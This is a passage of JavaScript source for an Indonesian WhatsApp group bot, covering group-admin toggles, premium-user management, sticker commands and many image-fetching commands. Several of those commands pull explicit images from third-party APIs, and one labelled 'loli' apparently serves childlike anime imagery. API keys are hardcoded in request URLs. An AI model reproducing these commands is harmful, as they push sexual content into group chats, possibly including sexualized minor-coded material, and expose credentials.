            buttonnss = [{buttonId: `tivo98 enable`, buttonText: {displayText: 'ENABLE'}, type: 1},{buttonId: `tivo98 disable`, buttonText: {displayText: 'DISABLE'}, type: 1}]
            const bufirMess = {
            contentText: "*Pilih AntiVo Apa Kak✨*",
            footerText: 'Silahkan Pilih Salah Satu☕',
            buttons: buttonnss,
            headerType: 1
}
            await pemuda.sendMessage(from, bufirMess, MessageType.buttonsMessage, {quoted: fgif})
            break    
    case 'tivo98':
            //if (!isRegister) return freply(mess.only.regis)    
            if (!isGroup) return freply(mess.only.group)
            if (!isGroupAdmins && !mek.key.fromMe) return freply(mess.only.admin)
            if (!isBotGroupAdmins) return freply(`Bot Harus jadi Admin`)
            if (!q) return freply(`Pilih enable atau disable`)
            if (args[0].toLowerCase() === 'enable'){
            if (isAntiVO) return freply(`Udah aktif`)
            antiviewonce.push(from)
            fs.writeFileSync('./database/antiviewonce.json', JSON.stringify(antiviewonce))
            freply('Sukses mengaktifkan fitur antiviewonce di group ini ✔️')
            } else if (args[0].toLowerCase() === 'disable'){
            let anu = antilinkwame.indexOf(from)
            antiviewonce.splice(anu, 1)
            fs.writeFileSync('./database/antiviewonce.json', JSON.stringify(antiviewonce))
            freply('Sukses menonaktifkan fitur antiviewonce di group ini ✔️')
            } else {
            freply(`Enable untuk mengaktifkan, disable untuk menonaktifkan`)
}
            break
    case 'welcome':
    case 'welcome enable': 
    case 'welcome disable':
            //if (!isRegister) return freply(mess.only.regis)    
            if (!isGroup) return freply(mess.only.group)
            if (!isGroupAdmins && !mek.key.fromMe) return freply(mess.only.admin)                 
            buttonnss = [{buttonId: `come[] enable`, buttonText: {displayText: 'ENABLE'}, type: 1},{buttonId: `come[] disable`, buttonText: {displayText: 'DISABLE'}, type: 1}]
            const bufirpMess = {
            contentText: "*Pilih Welcome Apa Kak✨*",
            footerText: 'Silahkan Pilih Salah Satu☕',
            buttons: buttonnss,
            headerType: 1
}
            await pemuda.sendMessage(from, bufirpMess, MessageType.buttonsMessage, {quoted: fgif})
            break            
    case 'come[]':
            //if (!isRegister) return freply(mess.only.regis)    
            if (!isGroup) return freply(mess.only.group)
            if (!isGroupAdmins && !mek.key.fromMe) return freply(mess.only.admin)
            if (args.length < 1) return freply('!welcome enable/disable')
            if ((args[0]) === 'enable') {
            if (isWelkom) return freply('Udah aktif')
            welkom.push(from)
            fs.writeFileSync('./database/welcome.json', JSON.stringify(welkom))
            freply('Sukses mengaktifkan fitur welcome di group ini ✔️')
            } else if ((args[0]) === 'disable') {
            welkom.splice(from, 1)
            fs.writeFileSync('./database/welcome.json', JSON.stringify(welkom))
            freply('Sukses menonaktifkan fitur welcome di group ini ✔️')
            } else {
            freply('Enable untuk mengaktifkan, disable untuk menonaktifkan')
}
            break

 
    case 'mute':
    case 'mute enable': 
    case 'mute disable': 
            //if (!isRegister) return freply(mess.only.regis)    
            if (!isGroup) return freply(mess.only.group)
            if (!isGroupAdmins && !mek.key.fromMe) return freply(mess.only.admin)                
            buttonnss = [{buttonId: `mute56 enable`, buttonText: {displayText: 'ENABLE'}, type: 1},{buttonId: `mute56 disable`, buttonText: {displayText: 'DISABLE'}, type: 1}]
            const bufirkMess = {
            contentText: "*Pilih Mute Apa Kak✨*",
            footerText: 'Silahkan Pilih Salah Satu☕',
            buttons: buttonnss,
            headerType: 1
}
            await pemuda.sendMessage(from, bufirkMess, MessageType.buttonsMessage, {quoted: fgif})
            break             
    case 'mute56':
            //if (!isRegister) return freply(mess.only.regis)    
            if (!isGroup) return freply(mess.only.group)
            if (!isGroupAdmins && !mek.key.fromMe) return freply(mess.only.admin)     
            if (args.length < 1) return freply('!mute enable/disable')
            if (args[0].toLowerCase() === 'enable'){
            if (isMuted) return freply(`udah di mute`)
            mute.push(from)
            fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
            freply(`*...:* *MODE ON* *:...*\n\nPerhatian untuk member grup\nBot telah di mute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${botName}*_`)
            } else if (args[0].toLowerCase() === 'disable'){
            anu = mute.indexOf(from)
            mute.splice(anu, 1)
            fs.writeFileSync('./database/mute.json', JSON.stringify(mute))
            freply(`*...:* *MODE OFF* *:...*\n\nPerhatian untuk member grup\nBot telah di unmute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${botName}*_`)
            } else {
            freply(`Pilih enable atau disable`)
}
            break


//------------------< Premium >-------------------
    case 'premium': 
            if(!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
            if (args[0] === 'add') {
            if (mek.message.extendedTextMessage != undefined) {
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            _prem.addPremiumUser(mentioned[0], args[2], premium)
            freply(`*──「 PREMIUM ADDED 」──*\n\n༄ *ID*: ${mentioned[0]}\n༄ *Expired*: ${ms(toMs(args[2])).days} days ${ms(toMs(args[2])).hours} hours ${ms(toMs(args[2])).minutes} minutes`)                        
            } else {                            
            _prem.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], premium)
            freply(`*──「 PREMIUM ADDED 」──*\n\n༄ *ID*: ${args[1]}@s.whatsapp.net\n༄ *Expired*: ${ms(toMs(args[2])).days} days ${ms(toMs(args[2])).hours} hours ${ms(toMs(args[2])).minutes} minutes`)
}
            } else if (args[0] === 'del') {
            if (mek.message.extendedTextMessage != undefined) {
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            premium.splice(_prem.getPremiumPosition(mentioned[0], premium), 1)
            fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
            freply(mess.success)
            } else {
            premium.splice(_prem.getPremiumPosition(args[1] + '@s.whatsapp.net', premium), 1)
            fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
            freply(mess.success)
}
            } else {
            reply(mess.wrongFormat)
}
            break
    case 'listprem':
    case 'listpremium': 
            //if (!isRegister) return freply(mess.only.regis)            
            let txt = `*──「 USER PREMIUM 」──*\n\n`
            let men = [];
            for (let i of premium){
            men.push(i.id)
            const checkExp = ms(i.expired - Date.now())
            txt += `༄ *ID :* @${i.id.split("@")[0]}\n༄ *Expired*: ${checkExp.days} days ${checkExp.hours} hours ${checkExp.minutes} minutes\n\n`
}
            mentionsss(txt, men, true)
            break
                                                                                                                                                                                
//<------------------< Sticker >---------------->   
    case 'addcmd': 
    case 'setcmd':
            //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)    
            if (isQuotedSticker) {
            if (!q) return freply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
            var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
            addCmd(kodenya, q)
            freply("Done Bwang")
            } else {
            freply('tag stickenya')
            }
            break
    case 'delcmd':
            //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)    
            if (!isQuotedSticker) return freply(`Penggunaan : ${command} tagsticker`)
            var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
            scommand.splice(getCommandPosition(kodenya), 1)
            fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
            freply("Done Bwang")
            break
    case 'listcmd':
            //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)    
            let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
            let cemde = [];
            for (let i of scommand) {
            cemde.push(i.id)
            teksnyee += `\n\n*•> ID :* ${i.id}\n*•> Cmd :* ${i.chats}`
            }
            freply(teksnyee)
            break 
                                                                                                                                                                                                                                                                                       
//<------------------< Wibu >---------------->   
      case 'storyanime':
      case 'sanime':{
           get_result = await getBuffer(`https://api.dapuhy.ga/api/anime/storyanime?apikey=${dapapi}`)
           kodi = `Nih Kack`
           sendButVideo(from, kodi, `Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎`, get_result, [{
           buttonId: `${prefix+command}`,buttonText: {displayText: `➡️Next`,},type: 1}])}
           break       
      case 'quotesyt':
           haiii = await getBuffer(`https://api.dapuhy.ga/api/randomimage/quotesyt?apikey=${dapapi}`)
           buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
           imageMsg = (await pemuda.prepareMessageMedia(haiii, "imageMessage", { thumbnail: haiii, })).imageMessage
           buttonsMessage = {footerText:`Klik Next Untuk Melanjutkan`, imageMessage: imageMsg,
           contentText:`Nih Bang Quotes Nya☕`,buttons,headerType:4}
           prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
           pemuda.relayWAMessage(prep)      
           break 
      case 'pantun':
		   anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/pantun?apikey=Ikyy69`, {method: 'get'})
		   kata = anu.result
           buttons = [{buttonId: `${prefix}pantun`,buttonText:{displayText: 'Next ➡️'},type:1}]
           buttonsMessage = { contentText: `${kata}`, footerText: `Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙`, buttons: buttons, headerType: 1 }
           prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{contextInfo: { mentionedJid: [sender]},quoted:mek})
           pemuda.relayWAMessage(prep)
	  	   break                            
            
    case 'waifu':
    case 'loli':
    case 'husbu':
    case 'milf':
    case 'cosplay':
    case 'wallml':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)    
          let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
          let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
          fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
    	  buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = ( await pemuda.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)
          fs.unlinkSync(`./${sender}.jpeg`)
          break
                            
    case 'yuri':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)    
          kon = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=yuri&apikey=hardianto`)
          hai00 = await getBuffer(kon)          
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(hai00, "imageMessage", { thumbnail: hai00, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'anal':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)     
          aku = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=anal&apikey=hardianto`)
          kon = await getBuffer(aku)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'lesbian':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)     
          kau = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=lesbian&apikey=hardianto`)
          kon = await getBuffer(kau)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'eroneko':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)     
          hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=eroNeko&apikey=hardianto`)
          kon = await getBuffer(hai)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'bj':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)     
          hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=bJ&apikey=hardianto`)
          kon = await getBuffer(hai)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'kitsune':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)     
          hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=kitsune&apikey=hardianto`)
          kon = await getBuffer(hai)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'pussy':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)     
          hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=pussy&apikey=hardianto`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'wallpaper':   
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)      
          hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=wallpaper&apikey=hardianto`)
          kon = await getBuffer(hai)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'neko2':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)     
          hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=hardianto`)
          kon = await getBuffer(hai)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'baka':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)     
          hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=baka&apikey=hardianto`)
          kon = await getBuffer(hai)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'slap':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)     
          hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=slap&apikey=hardianto`)
          kon = await getBuffer(hai)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'poke':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)     
          hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=poke&apikey=hardianto`)
          kon = await getBuffer(hai)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'neko2':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)     
          hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=hardianto`)
          kon = await getBuffer(hai)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'keta':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)     
          hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=keta&apikey=hardianto`)
          kon = await getBuffer(hai)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(kon, "imageMessage", { thumbnail: kon, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'awoo':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)     
          anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
          buffer = await getBuffer(anu.url)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(buffer, "imageMessage", { thumbnail: buffer, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'blowjob':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)     
          anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
          buffer = await getBuffer(anu.url)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(buffer, "imageMessage", { thumbnail: buffer, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'hentai': 
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)              
          anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
          buffer = await getBuffer(anu.url)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(buffer, "imageMessage", { thumbnail: buffer, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'megumin':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)     
          anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
          buffer = await getBuffer(anu.url)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(buffer, "imageMessage", { thumbnail: buffer, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'neko':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)     
          anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
          buffer = await getBuffer(anu.url)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(buffer, "imageMessage", { thumbnail: buffer, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break
    case 'trapnime':
          //if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)     
          anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
          buffer = await getBuffer(anu.url)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
          imageMsg = (await pemuda.prepareMessageMedia(buffer, "imageMessage", { thumbnail: buffer, })).imageMessage
          buttonsMessage = {footerText:'Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎', imageMessage: imageMsg,
          contentText:`Nih Kack`,buttons,headerType:4}
          prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
          pemuda.relayWAMessage(prep)                
          break                   
//<------------------< Grup >---------------->
    case 'grup':
    case 'group':
    case 'group close': 
    case 'group open': 
    case 'grup close':
    case 'grup open':  
            //if (!isRegister) return freply(mess.only.regis)    
            if (!isGroup) return freply(mess.only.group)
            if (!isGroupAdmins && !mek.key.fromMe) return freply(mess.only.admin)        
            buttonnss = [{buttonId: `coke open`, buttonText: {displayText: 'OPEN'}, type: 1},{buttonId: `coke close`, buttonText: {displayText: 'CLOSE'}, type: 1}]
            const bufweMess = {
            contentText: "*Pilih Group Apa Kak✨*",
            footerText: 'Silahkan Pilih Salah Satu☕',
            buttons: buttonnss,
            headerType: 1
}
            await pemuda.sendMessage(from, bufweMess, MessageType.buttonsMessage, {quoted: fgif})
            break      
case 'coke':
            //if (!isRegister) return freply(mess.only.regis)
            if (!isGroup) return freply(mess.only.group)
            if (!isGroupAdmins && !mek.key.fromMe) return freply(mess.only.admin)
            if (!isBotGroupAdmins) return freply(`Bot Harus jadi Admin`)
            if (args[0] === 'open') {
            freply(mess.success)
            pemuda.groupSettingChange(from, GroupSettingChange.messageSend, false)
            } else if (args[0] === 'close') {
            freply(mess.success)
            pemuda.groupSettingChange(from, GroupSettingChange.messageSend, true)
}
            break
case 'setdesc':
           if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
           if (!isBotGroupAdmins) return freply('Bot bukan admin kak')
           if (!isGroup) return
           pemuda.groupUpdateDescription(from, `${args.join(" ")}`)
           pemuda.sendMessage(from, 'Succes change description group', text, {quoted:mek})
           break
case 'setname':
           if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
           if (!isBotGroupAdmins) return freply('Bot bukan admin kak')
           if (!isGroup) return
           pemuda.groupUpdateSubject(from, `${args.join(" ")}`)
           pemuda.sendMessage(from, 'Succes change name group', text, {quoted:mek})
           break
case 'online':
case 'listonline':
case 'here':
           //if (!isRegister) return freply(mess.only.regis)                
           if (!isGroup) return reply(`Only group`)
           try {
           let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
           let online = [...Object.keys(pemuda.chats.get(ido).presences), pemuda.user.jid]
           pemuda.sendMessage(from, '*──「 LIST ONLINE 」──*\n\n' + online.map(v => '༺ @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: fdoc, contextInfo: { mentionedJid: online }})
           } catch (e) {
           freply(`${e}`)
}
           break                      
case 'infogrup':
case 'infogc':
case 'gcinfo':
case 'infogrouup':
case 'grupinfo':
case 'groupinfo':
           //if (!isRegister) return freply(mess.only.regis)
           if (!isGroup) return reply(mess.only.group)

           try {

           var pic = await pemuda.getProfilePicture(from)

           } catch {

           var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'

}

           let ingfo = `*──「 INFO GRUP 」──*
              
*Name : ${groupName}*
*ID Grup : ${from}*
*Dibuat : ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}*
*Owner Grup : @${groupMetadata.owner.split('@')[0]}*
*Jumlah Admin : ${groupAdmins.length} Admin*
*Jumlah Peserta : ${groupMembers.length} Member*

*Deskripsi Grup*
${groupDesc}`

